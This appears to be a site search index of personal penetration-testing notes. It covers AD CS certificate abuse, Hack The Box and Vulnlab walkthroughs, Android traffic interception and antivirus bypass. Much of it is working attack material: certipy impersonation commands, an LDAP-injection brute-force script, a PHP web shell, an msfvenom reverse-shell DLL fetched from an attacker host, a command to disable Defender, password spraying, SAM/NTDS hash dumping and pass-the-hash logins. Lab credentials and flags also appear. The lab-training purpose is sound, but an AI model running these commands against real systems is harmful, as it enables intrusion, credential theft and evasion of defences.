[{"content":"","date":"2023-09-07","id":0,"permalink":"/notes/ad/","summary":"","tags":[],"title":"AD"},{"content":"","date":"2023-09-07","id":1,"permalink":"/notes/shell-and-payload/","summary":"","tags":[],"title":"Reverse Shell"},{"content":"","date":"2023-09-07","id":2,"permalink":"/notes/web/","summary":"","tags":[],"title":"Webs"},{"content":"","date":"2023-09-07","id":3,"permalink":"/notes/services/","summary":"","tags":[],"title":"Services"},{"content":"","date":"2023-09-07","id":4,"permalink":"/notes/lab/","summary":"","tags":[],"title":"Labs"},{"content":"","date":"2023-09-07","id":5,"permalink":"/notes/pwn-reverse/","summary":"","tags":[],"title":"Pwn-Reverse"},{"content":"","date":"2023-09-07","id":6,"permalink":"/notes/code/","summary":"","tags":[],"title":"Dev"},{"content":"","date":"2023-09-07","id":7,"permalink":"/notes/ressources/","summary":"","tags":[],"title":"Ressources"},{"content":"Well-thought-through product announcements will help increase feature awareness and engage users with new functionality. Just like sharing your public roadmap, it\u0026rsquo;s also a great way to let potential customers see that you\u0026rsquo;re constantly improving.\nFurther reading Read How to announce product updates and features ","date":"2023-09-07","id":8,"permalink":"/blog/prototype-pollution/","summary":"You can use blog posts for announcing product updates and features.","tags":[],"title":"Prototype Pollution"},{"content":"","date":"2023-09-07","id":9,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":10,"permalink":"/notes/ad/local-privilege-escalation/","summary":"","tags":[],"title":"Local Privilege escalation"},{"content":"","date":"2023-09-07","id":11,"permalink":"/notes/ad/tools/","summary":"","tags":[],"title":"Tools"},{"content":"ESC1 Find vulnerable certificate templates :\ncertipy find -u \u0026#39;banking$\u0026#39;@retro.vl -p \u0026#39;TestPass!2\u0026#39; -dc-ip 10.10.65.99\rImpersonate an admin :\ncertipy req -username \u0026#39;banking$\u0026#39;@retro.vl -password \u0026#39;TestPass!2\u0026#39; -target-ip \u0026#39;dc.retro.vl\u0026#39; -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn \u0026#39;administrator@retro.vl\u0026#39; -debug -key-size 4096 certipy req -username \u0026#39;FRAJMP$\u0026#39;@heron.vl -hashes 6f55b3b443ef192c804b2ae98e8254f7 -target-ip \u0026#39;10.10.251.229\u0026#39; -ca \u0026#39;heron-CA\u0026#39; -template \u0026#39;HybridComputers\u0026#39; -upn \u0026#39;Administrator@heron.vl\u0026#39; -debug -key-size 4096 -dns heron.vl\rThen you can transform the generated certificate to **.pfx** format and use it to authenticate using certipy again:\ncertipy auth -pfx \u0026#39;administrator.pfx\u0026#39; -username \u0026#39;administrator\u0026#39; -domain \u0026#39;retro.vl\u0026#39; -dc-ip 10.10.65.99\rResult : [*] Using principal: administrator@retro.vl [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@retro.vl\u0026#39;: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389\rESC8 : certipy relay -ca \u0026#34;bruno-BRUNODC-CA\u0026#34; -target brunodc.bruno.vl -template KerberosAuthentication\rpetitpotam.py -d \u0026#39;bruno\u0026#39; -u \u0026#39;svc_scan\u0026#39; -p \u0026#39;Sunshine1\u0026#39; 10.8.3.12 $t\r","date":"2023-09-07","id":12,"permalink":"/notes/ad/ad-cs/","summary":"\u003ch3 id=\"esc1\"\u003eESC1\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eFind vulnerable certificate templates :\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecertipy find -u \u003cspan class=\"s1\"\u003e\u0026#39;banking$\u0026#39;\u003c/span\u003e@retro.vl -p \u003cspan class=\"s1\"\u003e\u0026#39;TestPass!2\u0026#39;\u003c/span\u003e -dc-ip 10.10.65.99\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eImpersonate an admin :\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecertipy req -username \u003cspan class=\"s1\"\u003e\u0026#39;banking$\u0026#39;\u003c/span\u003e@retro.vl -password \u003cspan class=\"s1\"\u003e\u0026#39;TestPass!2\u0026#39;\u003c/span\u003e -target-ip \u003cspan class=\"s1\"\u003e\u0026#39;dc.retro.vl\u0026#39;\u003c/span\u003e -ca \u003cspan class=\"s1\"\u003e\u0026#39;retro-DC-CA\u0026#39;\u003c/span\u003e -template \u003cspan class=\"s1\"\u003e\u0026#39;RetroClients\u0026#39;\u003c/span\u003e -upn \u003cspan class=\"s1\"\u003e\u0026#39;administrator@retro.vl\u0026#39;\u003c/span\u003e  -debug -key-size \u003cspan class=\"m\"\u003e4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecertipy req -username \u003cspan class=\"s1\"\u003e\u0026#39;FRAJMP$\u0026#39;\u003c/span\u003e@heron.vl -hashes 6f55b3b443ef192c804b2ae98e8254f7 -target-ip \u003cspan class=\"s1\"\u003e\u0026#39;10.10.251.229\u0026#39;\u003c/span\u003e -ca \u003cspan class=\"s1\"\u003e\u0026#39;heron-CA\u0026#39;\u003c/span\u003e -template \u003cspan class=\"s1\"\u003e\u0026#39;HybridComputers\u0026#39;\u003c/span\u003e -upn \u003cspan class=\"s1\"\u003e\u0026#39;Administrator@heron.vl\u0026#39;\u003c/span\u003e  -debug -key-size \u003cspan class=\"m\"\u003e4096\u003c/span\u003e -dns heron.vl\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eThen you can transform the generated \u003cstrong\u003ecertificate to\u003c/strong\u003e \u003ccode\u003e**.pfx**\u003c/code\u003e format and use it to \u003cstrong\u003eauthenticate using   certipy\u003c/strong\u003e again:\u003c/p\u003e","tags":[],"title":"AD CS"},{"content":"#ldap_injection #dll_injection\nScan nmap ➜ ~ nmap 10.10.11.250 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 13:42 CET Nmap scan report for analysis.htb (10.10.11.250) Host is up (0.027s latency). Not shown: 987 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3306/tcp open mysql\rsub-domain enumeration ➜ ~ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://analysis.htb/ -H \u0026#39;Host: FUZZ.analysis.htb\u0026#39; internal target : http://internal.analysis.htb/\nDirectory enumeration ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/FUZZ -e .php users p dashboard employees file enumeration ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://internal.analysis.htb/users/FUZZ -e .php users: list.php\rffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://internal.analysis.htb/employees/FUZZ -e .php employees: login.php\rffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://internal.analysis.htb/dashboard/FUZZ -e .php dashboard : index.php img uploads upload.php details.php css Index.php lib form.php js logout.php tickets.php emergency.php Form.php Parameter Enumeration : ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u \u0026#34;http://internal.analysis.htb/users/list.php?FUZZ=key\u0026#34; -fs 17 name ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u \u0026#34;http://internal.analysis.htb/users/list.php?name=*)(FUZZ=*\u0026#34; Description Brute force Description : Python code :\nimport requests def main(): url=f\u0026#39;http://internal.analysis.htb/users/list.php?name=*)(description=\u0026#39; charset=\u0026#39;ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvxyz0123456789/*-+.;_()\u0026#39; charset = list(charset.strip(\u0026#39;\u0026#39;)) while True : for i in range(69): answer = url + charset[i] send = answer + \u0026#34;*\u0026#34; r=requests.get(send, stream=True).headers[\u0026#39;Content-length\u0026#39;] if \u0026#34;418\u0026#34; in r or \u0026#34;8\u0026#34;in r : print(answer + \u0026#34;\\nGood characters\u0026#34;) url= answer break else: None\tif __name__ == \u0026#39;__main__\u0026#39;: main()\rCreds : Technician/technician@analysis.htb | 97NTtl*4QP96Bv\nrlwrap nc -nlvp 4242 php web shell:\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; creds : jdoe | 7y4Z4^*y9Zzj\ncrackmapexec winrm 10.10.11.250 -u jdoe -p \u0026#34;7y4Z4^*y9Zzj\u0026#34; evil-winrm -i 10.10.11.250 -u jdoe -p \u0026#39;7y4Z4^*y9Zzj\u0026#39;\rPrivesc msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.167 LPORT=4242 -f dll \u0026gt; sf_engine.dll curl -o sf_engine.dll http://10.10.14.93:8080/sf_engine.dll certutil -urlcache -split -f http://10.10.14.237:8080/sf_engine.dll sf_engine.dll\r","date":"2023-09-07","id":13,"permalink":"/notes/lab/htb/analysis/","summary":"\u003cp\u003e#ldap_injection #dll_injection\u003c/p\u003e\n\u003ch2 id=\"scan-nmap\"\u003eScan nmap\u003c/h2\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e➜  ~ nmap 10.10.11.250\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94SVN \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-02-13 13:42 CET\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e analysis.htb \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.11.250\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.027s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e987\u003c/span\u003e closed tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003econn-refused\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  http-rpc-epmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ldapssl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  globalcatLDAP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  globalcatLDAPssl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3306/tcp open  mysql\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003ch2 id=\"sub-domain-enumeration\"\u003esub-domain enumeration\u003c/h2\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e➜  ~ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://analysis.htb/ -H \u003cspan class=\"s1\"\u003e\u0026#39;Host: FUZZ.analysis.htb\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einternal               \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003etarget : http://internal.analysis.htb/\u003c/p\u003e","tags":[],"title":"Analysis"},{"content":"Emulation + Burp Setup Genymotion \u0026amp; install Gapp . adb devices adb connect 127.0.0.1:6555 adb shell settings put global http_proxy localhost:3333 adb reverse tcp:3333 tcp:6767\rGenerate a new certificate with burp and apply this command on it : openssl x509 -inform DER -in burp.der -out burp.pem\ropenssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1\rName of certificate must a the same value from the last command plus .0 : mv burp.pem 9a5ba575.0 adb root \u0026amp;\u0026amp; adb remount adb push 9a5ba575.0 /sdcard/ adb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/ chmod 644 /system/etc/security/cacerts/9a5ba575.0\rBypass SSL pinning : https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/ https://github.com/frida/frida\nPlace the frida-server into the target :\nadb push frida-server-16.5.7-android-x86 /data/local/frida-new-server chmod +x frida-new-server \u0026amp;\u0026amp; ./frida-new-server\rInstall frida : sudo pip3 install frida frida-tools objection\rCreate a file to place the js script that frida will run and run this command : frida -U -f package_name_target -l fridascript.js frida -U -f com.some.appdiscovery -l fridascript.js Example : https://play.google.com/store/apps/details?id=com.some.appdiscovery\u0026amp;hl=fr\u0026amp;pli=1 App to apk Check is devices detected : adb shell pm list packages\rList package on the device : adb shell pm list packages\rGet the path of the package : adb shell pm path com.example.someapp-2.apk\rDownload the apk : adb pull /data/app/com.example.someapp-2.apk\r","date":"2023-09-07","id":14,"permalink":"/notes/pwn-reverse/android-emulation/","summary":"\u003ch2 id=\"emulation--burp\"\u003eEmulation + Burp\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eSetup Genymotion \u0026amp; install Gapp .\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cpre tabindex=\"0\"\u003e\u003ccode\u003eadb devices\nadb connect 127.0.0.1:6555\nadb shell settings put global http_proxy localhost:3333\nadb reverse tcp:3333 tcp:6767\u003c/code\u003e\u003c/pre\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGenerate a new certificate with burp and apply this command on it  :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl x509 -inform DER -in burp.der -out burp.pem\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl x509 -inform PEM -subject_hash_old -in burp.pem \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -1\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eName of certificate must a the same value from the last command plus \u003ccode\u003e.0\u003c/code\u003e :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv burp.pem 9a5ba575.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadb root \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e adb remount\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadb push 9a5ba575.0 /sdcard/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadb shell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e644\u003c/span\u003e /system/etc/security/cacerts/9a5ba575.0\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eBypass SSL pinning  :\nhttps://codeshare.frida.re/@akabe1/frida-multiple-unpinning/\nhttps://github.com/frida/frida\u003c/p\u003e","tags":[],"title":"Android Emulation"},{"content":"","date":"2023-09-07","id":15,"permalink":"/notes/ressources/arch-setup/","summary":"","tags":[],"title":"Arch-Setup"},{"content":"","date":"2023-09-07","id":16,"permalink":"/notes/code/asm/","summary":"","tags":[],"title":"ASM"},{"content":"Ressources:\nhttps://amsi.fail/ https://github.com/0xb11a1/yetAnotherObfuscator/releases\nDisable AV : Set-MpPreference -DisableRealtimeMonitoring $true\rShellter: https://github.com/Hanrikusvz/Powershell-to-shellcode\nhttps://www.microsoft.com/en-us/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/\n","date":"2023-09-07","id":17,"permalink":"/notes/ad/av-amsi-bypass/","summary":"\u003cp\u003eRessources:\u003c/p\u003e\n\u003cp\u003ehttps://amsi.fail/\nhttps://github.com/0xb11a1/yetAnotherObfuscator/releases\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDisable AV :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSet-MpPreference -DisableRealtimeMonitoring \u003cspan class=\"nv\"\u003e$true\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eShellter:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ehttps://github.com/Hanrikusvz/Powershell-to-shellcode\u003c/p\u003e\n\u003cp\u003ehttps://www.microsoft.com/en-us/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/\u003c/p\u003e","tags":[],"title":"AV \u0026 AMSI Bypass"},{"content":"#ldap #passthehash #ntds Scan\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-27 15:50:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: BABY | NetBIOS_Domain_Name: BABY | NetBIOS_Computer_Name: BABYDC | DNS_Domain_Name: baby.vl | DNS_Computer_Name: BabyDC.baby.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-07-27T15:50:49+00:00 |_ssl-date: 2024-07-27T15:51:29+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=BabyDC.baby.vl | Not valid before: 2024-07-26T09:03:15 |_Not valid after: 2025-01-25T09:03:15 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-07-27T15:50:53 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rEnem of ldap : ldapsearch -x -H ldap://$t -b \u0026#39;DC=baby,DC=vl\u0026#39; | awk \u0026#39;/dn: / {print $2}\u0026#39;\rResult : ldapsearch -H ldap://$t -x -b \u0026#39;DC=baby,DC=vl\u0026#39; \u0026#34;*\u0026#34; \u0026#34;*\u0026#34; | grep userPrincipalName | cut -d \u0026#34; \u0026#34; -f 2 | cut -d \u0026#34;@\u0026#34; -f 1\rJacqueline.Barnett Ashley.Webb Hugh.George Leonard.Dyer Connor.Wilkinson Joseph.Hughes Kerry.Wilson Teresa.Bell Caroline.Robinson\rGrab a some creds : # Teresa Bell, it, baby.vl dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Teresa Bell sn: Bell description: Set initial password to BabyStart123! givenName: Teresa distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl instanceType: 4 whenCreated: 20211121151108.0Z whenChanged: 20211121151437.0Z displayName: Teresa Bell uSNCreated: 12889 memberOf: CN=it,CN=Users,DC=baby,DC=vl uSNChanged: 12905 name: Teresa Bell objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ== userAccountControl: 66080 badPwdCount: 0 codePage: 0 countryCode: 0 badPasswordTime: 0 lastLogoff: 0 lastLogon: 0 pwdLastSet: 132819812778759642 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA== accountExpires: 9223372036854775807 logonCount: 0 sAMAccountName: Teresa.Bell sAMAccountType: 805306368 userPrincipalName: Teresa.Bell@baby.vl objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl dSCorePropagationData: 20211121163014.0Z dSCorePropagationData: 20211121162927.0Z dSCorePropagationData: 16010101000416.0Z msDS-SupportedEncryptionTypes: 0\rPassword spraying with net exec: netexec ldap $t -u usernames.txt -p \u0026#39;BabyStart123!\u0026#39;\rCaroline.Robinson : BabyStart123!\nReset password with impacket : smbpasswd -r $t -U \u0026#39;$user\u0026#39;\rnew pass : Pentest_1234\nShell:\nevil-winrm -i $t -u Caroline.Robinson -p \u0026#39;Pentest_1234\u0026#39;\rUser VL{b2c6150b85125d32f4b253df9540d898}\nRecover SAM.SAV and SYSTEM.SAV :\nreg save HKLM\\SYSTEM SYSTEM.SAV reg save HKLM\\SAM SAM.SAV\rResult : [*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. [*] Cleaning up...\rNothing interesting\nSo we extract NTDS.DIT : secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL\rConnect with pass the hash : evil-winrm -i $t -u Administrator -H \u0026#39;ee4457ae59f1e3fbd764e33d9cef123d\u0026#39;\rRoot VL{9000cab96bcf62e99073ff5f6653ce90}\n","date":"2023-09-07","id":18,"permalink":"/notes/lab/vulnlab/baby/","summary":"\u003cp\u003e#ldap #passthehash #ntds\nScan\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" 